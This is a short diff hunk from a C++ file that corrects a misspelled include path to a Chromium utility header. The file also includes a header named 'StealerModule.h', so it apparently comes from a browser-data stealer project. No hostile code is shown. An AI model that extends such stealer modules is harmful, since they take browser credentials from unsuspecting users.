@@ -11,7 +11,7 @@
 #include "json.hpp"
 
 #include "../../../StealerModule.h"
-#include "../../../../utils/chromuim/ChromuimUtil.h"
+#include "../../../../utils/chromuim/ChromiumUtil.h"
 
 using json = nlohmann::json;
 
